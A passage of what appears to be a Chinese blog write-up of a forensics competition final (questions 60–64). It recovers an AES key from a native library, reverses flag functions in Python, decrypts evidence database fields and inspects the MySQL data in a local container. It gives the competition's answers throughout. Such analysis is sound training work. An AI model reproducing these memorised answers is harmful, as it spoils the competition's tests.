class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">============================================================</span><br><span class="line">恢复的AES密钥:</span><br><span class="line">============================================================</span><br><span class="line">密钥1 (aeskey_0):     7a68616f686f6e677a68616f686f6e67</span><br><span class="line">密钥1 ASCII:          zhaohongzhaohong</span><br><span class="line"></span><br><span class="line">密钥2 (xmmword_4190):  00000000000000000000000000000000</span><br><span class="line"></span><br><span class="line">完整密钥 (32字节):    7a68616f686f6e677a68616f686f6e6700000000000000000000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zhaohongzhaohongzhaohongzhaohong</span><br></pre></td></tr></table></figure>

<p>60.(填空)请继续分析上题SO文件，尝试分析get_flag1函数，该返回值为 (参考格式:abc123) 分值:26</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015211355-xx7912x.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hong112233</span><br></pre></td></tr></table></figure>

<p>61.(填空)请继续分析上题SO文件，尝试分析get_flag2函数，该返回值为 (参考格式:qiang) 分值:29</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新构建精确的内存布局</span></span><br><span class="line"><span class="comment"># 基于栈偏移：</span></span><br><span class="line"><span class="comment"># v8 at [rsp+0Fh]</span></span><br><span class="line"><span class="comment"># v9 at [rsp+17h] (相对v8 +8)</span></span><br><span class="line"><span class="comment"># v10 at [rsp+34h] (相对v8 +37 = 0x25)</span></span><br><span class="line"><span class="comment"># v11 at [rsp+3Ch] (相对v8 +45 = 0x2D)</span></span><br><span class="line"><span class="comment"># v12 at [rsp+44h] (相对v8 +53 = 0x35)</span></span><br><span class="line"><span class="comment"># v13 at [rsp+4Ch] (相对v8 +61 = 0x3D)</span></span><br><span class="line"><span class="comment"># v14 at [rsp+54h] (相对v8 +69 = 0x45)</span></span><br><span class="line"></span><br><span class="line">mem = <span class="built_in">bytearray</span>(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># v8 offset 0</span></span><br><span class="line">v8_offset = <span class="number">0</span></span><br><span class="line">mem[v8_offset:v8_offset+<span class="number">8</span>] = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x484F5C1540464B41</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># v9 offset 8</span></span><br><span class="line">v9_offset = <span class="number">8</span></span><br><span class="line">mem[v9_offset:v9_offset+<span class="number">3</span>] = <span class="string">b&#x27;I@Z&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># v10 offset 37</span></span><br><span class="line">mem[<span class="number">37</span>:<span class="number">45</span>] = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x600000000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># v11 offset 45</span></span><br><span class="line">mem[<span class="number">45</span>:<span class="number">53</span>] = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0xA00000002</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># v12 offset 53</span></span><br><span class="line">mem[<span class="number">53</span>:<span class="number">61</span>] = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x700000004</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># v13 offset 61</span></span><br><span class="line">mem[<span class="number">61</span>:<span class="number">69</span>] = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x100000009</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># v14 offset 69</span></span><br><span class="line">mem[<span class="number">69</span>:<span class="number">77</span>] = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x500000008</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Memory layout:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;v8 (0-7): <span class="subst">&#123;mem[<span class="number">0</span>:<span class="number">8</span>].<span class="built_in">hex</span>()&#125;</span> = <span class="subst">&#123;mem[<span class="number">0</span>:<span class="number">8</span>]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;v9 (8-10): <span class="subst">&#123;mem[<span class="number">8</span>:<span class="number">11</span>].<span class="built_in">hex</span>()&#125;</span> = <span class="subst">&#123;mem[<span class="number">8</span>:<span class="number">11</span>]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;v10 (37-44): <span class="subst">&#123;mem[<span class="number">37</span>:<span class="number">45</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;v11 (45-52): <span class="subst">&#123;mem[<span class="number">45</span>:<span class="number">53</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;v12 (53-60): <span class="subst">&#123;mem[<span class="number">53</span>:<span class="number">61</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;v13 (61-68): <span class="subst">&#123;mem[<span class="number">61</span>:<span class="number">69</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;v14 (69-76): <span class="subst">&#123;mem[<span class="number">69</span>:<span class="number">77</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一个循环</span></span><br><span class="line"><span class="comment"># for ( i = 64; ; i = *((_BYTE *)&amp;v9[-4] + *(int *)((char *)&amp;v9[2 * v1 + 12] + 1)) )</span></span><br><span class="line"><span class="comment"># &#123;</span></span><br><span class="line"><span class="comment">#   *((_BYTE *)&amp;v9[1] + ++v1) = i;</span></span><br><span class="line"><span class="comment">#   if ( v1 == 11 )</span></span><br><span class="line"><span class="comment">#     break;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">sequence = [<span class="number">0</span>] * <span class="number">12</span></span><br><span class="line">sequence[<span class="number">0</span>] = <span class="number">64</span>  <span class="comment"># 初始值</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n=== Loop 1 ===&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> v1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    <span class="comment"># (char *)&amp;v9[2 * v1 + 12] + 1</span></span><br><span class="line">    <span class="comment"># v9是__int16数组，所以v9[idx]的字节偏移是idx*2</span></span><br><span class="line">    v9_index = <span class="number">2</span> * v1 + <span class="number">12</span></span><br><span class="line">    byte_offset_in_v9 = v9_index * <span class="number">2</span>  <span class="comment"># __int16是2字节</span></span><br><span class="line">    addr = v9_offset + byte_offset_in_v9 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  v1=<span class="subst">&#123;v1&#125;</span>: v9[<span class="subst">&#123;v9_index&#125;</span>] at byte offset <span class="subst">&#123;byte_offset_in_v9&#125;</span>, +1 = addr <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从addr读取4字节int</span></span><br><span class="line">    <span class="keyword">if</span> addr + <span class="number">4</span> &lt;= <span class="built_in">len</span>(mem):</span><br><span class="line">        offset_val = struct.unpack(<span class="string">&#x27;&lt;i&#x27;</span>, mem[addr:addr+<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    Read int at <span class="subst">&#123;addr&#125;</span>: <span class="subst">&#123;offset_val&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># &amp;v9[-4] = v8_offset (v9向前4个__int16 = 8字节)</span></span><br><span class="line">        <span class="comment"># 从v8 + offset读取字节</span></span><br><span class="line">        char_addr = v8_offset + offset_val</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= char_addr &lt; <span class="built_in">len</span>(mem):</span><br><span class="line">            char_val = mem[char_addr]</span><br><span class="line">            sequence[v1 + <span class="number">1</span>] = char_val</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    v8[<span class="subst">&#123;offset_val&#125;</span>] = &#x27;<span class="subst">&#123;<span class="built_in">chr</span>(char_val) <span class="keyword">if</span> <span class="number">32</span> &lt;= char_val &lt; <span class="number">127</span> <span class="keyword">else</span> <span class="string">f&#x27;\\x<span class="subst">&#123;char_val:02x&#125;</span>&#x27;</span>&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\nSequence after loop 1: <span class="subst">&#123;[<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(b) <span class="keyword">if</span> <span class="number">32</span> &lt;= b &lt; <span class="number">127</span> <span class="keyword">else</span> <span class="string">f&#x27;\\x<span class="subst">&#123;b:02x&#125;</span>&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> sequence])]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Sequence bytes: <span class="subst">&#123;[<span class="string">f&#x27;<span class="subst">&#123;b:02x&#125;</span>&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> sequence]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二个循环</span></span><br><span class="line"><span class="comment"># for ( j = 3LL; ; j = *(int *)((char *)&amp;v9[2 * v3 + 12] + 1) )</span></span><br><span class="line"><span class="comment"># &#123;</span></span><br><span class="line"><span class="comment">#   v15[j] = v3++;</span></span><br><span class="line"><span class="comment">#   if ( v3 == 11 )</span></span><br><span class="line"><span class="comment">#     break;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">v15 = [<span class="number">0</span>] * <span class="number">14</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n=== Loop 2 ===&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> v3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    v9_index = <span class="number">2</span> * v3 + <span class="number">12</span></span><br><span class="line">    byte_offset_in_v9 = v9_index * <span class="number">2</span></span><br><span class="line">    addr = v9_offset + byte_offset_in_v9 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> addr + <span class="number">4</span> &lt;= <span class="built_in">len</span>(mem):</span><br><span class="line">        j = struct.unpack(<span class="string">&#x27;&lt;i&#x27;</span>, mem[addr:addr+<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  v3=<span class="subst">&#123;v3&#125;</span>: j=<span class="subst">&#123;j&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= j &lt; <span class="number">14</span>:</span><br><span class="line">            v15[j] = v3</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\nv15 mapping: <span class="subst">&#123;v15&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三个循环</span></span><br><span class="line"><span class="comment"># for ( k = 0LL; k != 11; ++k )</span></span><br><span class="line"><span class="comment">#   *((_BYTE *)&amp;v9[7] + k) = *((_BYTE *)&amp;v9[1] + v15[k] + 1);</span></span><br><span class="line"></span><br><span class="line">reordered = [<span class="number">0</span>] * <span class="number">11</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n=== Loop 3 ===&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    <span class="comment"># *((_BYTE *)&amp;v9[1] + v15[k] + 1) 表示 sequence[v15[k] + 1]</span></span><br><span class="line">    source_idx = v15[k] + <span class="number">1</span></span><br><span class="line">    reordered[k] = sequence[source_idx]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  k=<span class="subst">&#123;k&#125;</span>: v15[<span class="subst">&#123;k&#125;</span>]=<span class="subst">&#123;v15[k]&#125;</span>, source_idx=<span class="subst">&#123;source_idx&#125;</span>, char=&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(sequence[source_idx]) <span class="keyword">if</span> <span class="number">32</span> &lt;= sequence[source_idx] &lt; <span class="number">127</span> <span class="keyword">else</span> <span class="string">f&#x27;\\x<span class="subst">&#123;sequence[source_idx]:02x&#125;</span>&#x27;</span>&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\nReordered: <span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(b) <span class="keyword">if</span> <span class="number">32</span> &lt;= b &lt; <span class="number">127</span> <span class="keyword">else</span> <span class="string">f&#x27;\\x<span class="subst">&#123;b:02x&#125;</span>&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> reordered])&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第四个循环</span></span><br><span class="line"><span class="comment"># for ( m = 0LL; m != 11; ++m )</span></span><br><span class="line"><span class="comment">#   v0[m] = *((_BYTE *)&amp;v9[7] + m) ^ 0x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n=== Loop 4 (XOR 0x27) ===&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    xored = reordered[m] ^ <span class="number">0x27</span></span><br><span class="line">    result.append(xored)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  m=<span class="subst">&#123;m&#125;</span>: <span class="subst">&#123;reordered[m]:02x&#125;</span> ^ 27 = <span class="subst">&#123;xored:02x&#125;</span> (&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(xored) <span class="keyword">if</span> <span class="number">32</span> &lt;= xored &lt; <span class="number">127</span> <span class="keyword">else</span> <span class="string">f&#x27;\\x<span class="subst">&#123;xored:02x&#125;</span>&#x27;</span>&#125;</span>&#x27;)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;<span class="string">&#x27;=&#x27;</span>*<span class="number">50</span>&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;FINAL FLAG2: <span class="subst">&#123;result.decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;=&#x27;</span>*<span class="number">50</span>&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">FINAL FLAG2: flaf2&#123;hong&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hong</span><br></pre></td></tr></table></figure>

<p>62.(填空)请继续分析上题SO文件，尝试分析decrypt函数，该密文dnJXwBR4qc+1Y4WB6ZxR0A&#x3D;&#x3D;的明文为 (参考格式:abc123) 分值:29</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015215132-c0gndjf.png" alt="image">​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015215824-up5g3rn.png" alt="image">​</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">FICerisgood</span><br></pre></td></tr></table></figure>

<p>63.(填空)请分析检材3数据库，在 products 表中，统计商品型号的种类数量（例如以 ZK、CW 等为前缀的型号） (参考格式:1) 分值:26</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251016160700-ovkw3ul.png" alt="image">​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251016160557-h7outdc.png" alt="image">​</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;products.ibd&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">all_enc = re.findall(<span class="string">rb&#x27;([A-Za-z0-9+/]&#123;16,&#125;==)&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">enc_b64, key, iv</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">        decrypted = unpad(cipher.decrypt(base64.b64decode(enc_b64)), <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">  </span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;([a-z]+)-\d+&#x27;</span>, re.IGNORECASE)</span><br><span class="line">prefixes = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> all_enc:</span><br><span class="line">    decrypted = decrypt(i.decode(<span class="string">&#x27;utf-8&#x27;</span>), <span class="string">b&#x27;zhaohongzhaohongzhaohongzhaohong&#x27;</span>, <span class="string">b&#x27;0123456789012345&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> decrypted:</span><br><span class="line">        <span class="keyword">match</span> = pattern.search(decrypted)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            prefixes.add(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;种类: <span class="subst">&#123;<span class="built_in">sorted</span>(prefixes)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;共 <span class="subst">&#123;<span class="built_in">len</span>(prefixes)&#125;</span> 种&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure>

<p>64.(填空)请分析检材3数据库，在 products 表中，统计型号为 “ZK” 且颜色为灰色的商品的数量 (参考格式:10) 分值:26</p>
<p>上一道题智能分析到一部分内容，全部的还是得把数据库启动起来看</p>
<p>在本地启动了一个mysql docker用来获取数据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  --name mysql-forensic \</span><br><span class="line">  -v /mnt/ssd/forensic/sql:/var/lib/mysql \        这里直接把数据库目录导出来，然后启动docker的时候直接挂载成卷，这样docker能直接读取，就不用复制了</span><br><span class="line">  -e MYSQL_ALLOW_EMPTY_PASSWORD=<span class="built_in">yes</span> \</span><br><span class="line">  -p 3307:3306 \</span><br><span class="line">  mysql:8.0 \</span><br><span class="line">  --skip-grant-tables</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> mysql-forensic mysqldump product_db &gt; product_db_backup.sql</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后写个脚本吧<code>.sql</code>​转换成<code>.xlsx</code>​</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_sql_inserts</span>(<span class="params">sql_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(sql_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    create_table_pattern = <span class="string">r&#x27;CREATE TABLE `(\w+)` \((.*?)\) ENGINE=&#x27;</span></span><br><span class="line">    tables_structure = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> re.finditer(create_table_pattern, content, re.DOTALL):</span><br><span class="line">        table_name = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        table_def = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line">        column_pattern = <span class="string">r&#x27;`(\w+)`\s+(?:int|varchar|text|timestamp)&#x27;</span></span><br><span class="line">        columns = re.findall(column_pattern, table_def)</span><br><span class="line">        tables_structure[table_name] = columns</span><br><span class="line">    insert_pattern = <span class="string">r&#x27;INSERT INTO `(\w+)` VALUES (.*?);&#x27;</span></span><br><span class="line">    tables_data = &#123;table: [] <span class="keyword">for</span> table <span class="keyword">in</span> tables_structure.keys()&#125;</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> re.finditer(insert_pattern, content, re.DOTALL):</span><br><span class="line">        table_name = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        values_str = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line">        row_pattern = <span class="string">r&#x27;\(([^)]+)\)&#x27;</span></span><br><span class="line">        rows = re.findall(row_pattern, values_str)</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> rows:</span><br><span class="line">            values = []</span><br><span class="line">            current_value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            in_quotes = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> row + <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> char == <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">and</span> (<span class="keyword">not</span> current_value <span class="keyword">or</span> current_value[-<span class="number">1</span>] != <span class="string">&#x27;\\&#x27;</span>):</span><br><span class="line">                    in_quotes = <span class="keyword">not</span> in_quotes</span><br><span class="line">                    current_value += char</span><br><span class="line">                <span class="keyword">elif</span> char == <span class="string">&#x27;,&#x27;</span> <span class="keyword">and</span> <span class="keyword">not</span> in_quotes:</span><br><span class="line">                    value = current_value.strip().strip(<span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">                    <span class="keyword">if</span> value == <span class="string">&#x27;NULL&#x27;</span>:</span><br><span class="line">                        value = <span class="literal">None</span></span><br><span class="line">                    values.append(value)</span><br><span class="line">                    current_value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    current_value += char</span><br><span class="line">            <span class="keyword">if</span> table_name <span class="keyword">in</span> tables_data:</span><br><span class="line">                tables_data[table_name].append(values)</span><br><span class="line">    <span class="keyword">return</span> tables_structure, tables_data</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_to_excel</span>(<span class="params">tables_structure, tables_data, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> pd.ExcelWriter(output_file, engine=<span class="string">&#x27;openpyxl&#x27;</span>) <span class="keyword">as</span> writer:</span><br><span class="line">        <span class="keyword">for</span> table_name, columns <span class="keyword">in</span> tables_structure.items():</span><br><span class="line">            <span class="keyword">if</span> table_name <span class="keyword">in</span> tables_data <span class="keyword">and</span> tables_data[table_name]:</span><br><span class="line">                df = pd.DataFrame(tables_data[table_name], columns=columns)</span><br><span class="line">                sheet_name = table_name[:<span class="number">31</span>]  <span class="comment"># Excel工作表名称最多31个字符</span></span><br><span class="line">                df.to_excel(writer, sheet_name=sheet_name, index=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    sql_files = <span class="built_in">list</span>(Path(<span class="string">&#x27;.&#x27;</span>).glob(<span class="string">&#x27;*.sql&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sql_files:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    sql_file = sql_files[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在处理SQL文件: <span class="subst">&#123;sql_file&#125;</span>&quot;</span>)</span><br><span class="line">    output_file = sql_file.stem + <span class="string">&#x27;.xlsx&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tables_structure, tables_data = parse_sql_inserts(sql_file)</span><br><span class="line">        save_to_excel(tables_structure, tables_data, output_file)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Excel文件已保存为: <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">import</span> traceback</span><br><span class="line">        traceback.print_exc()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/17/2025FICfinal/image-20251016191659-w6nqcs9.png" alt="image">​</p>
<p>然后再写一个解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密参数</span></span><br><span class="line">KEY = <span class="string">b&#x27;zhaohongzhaohongzhaohongzhaohong&#x27;</span></span><br><span class="line">IV = <span class="string">b&#x27;0123456789012345&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_aes_cbc</span>(<span class="params">encrypted_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> encrypted_data <span class="keyword">or</span> pd.isna(encrypted_data):</span><br><span class="line">        <span class="keyword">return</span> encrypted_data</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        encrypted_bytes = base64.b64decode(encrypted_data)</span><br><span class="line">        cipher = AES.new(KEY, AES.MODE_CBC, IV)</span><br><span class="line">        decrypted_bytes = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)</span><br><span class="line">        <span class="keyword">return</span> decrypted_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解密失败 &#x27;<span class="subst">&#123;encrypted_data&#125;</span>&#x27;: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;[解密失败: <span class="subst">&#123;encrypted_data&#125;</span>]&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    excel_files = <span class="built_in">list</span>(Path(<span class="string">&#x27;.&#x27;</span>).glob(<span class="string">&#x27;*.xlsx&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> excel_files:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;当前目录下无xlsx文件&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    excel_file = excel_files[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        df = pd.read_excel(excel_file, sheet_name=<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;原始数据形状: <span class="subst">&#123;df.shape&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;列名: <span class="subst">&#123;df.columns.tolist()&#125;</span>\n&quot;</span>)</span><br><span class="line">        decrypt_columns = df.columns[<span class="number">1</span>:<span class="number">7</span>]  <span class="comment"># B到G列</span></span><br><span class="line">        decrypt_rows = <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">min</span>(<span class="number">335</span>, <span class="built_in">len</span>(df)))  <span class="comment"># 2到335行</span></span><br><span class="line">        decrypted_count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> row_idx <span class="keyword">in</span> decrypt_rows:</span><br><span class="line">            <span class="keyword">for</span> col <span class="keyword">in</span> decrypt_columns:</span><br><span class="line">                original_value = df.at[row_idx, col]</span><br><span class="line">                decrypted_value = decrypt_aes_cbc(original_value)</span><br><span class="line">                <span class="keyword">if</span> original_value != decrypted_value:</span><br><span class="line">                    df.at[row_idx, col] = decrypted_value</span><br><span class="line">                    decrypted_count += <span 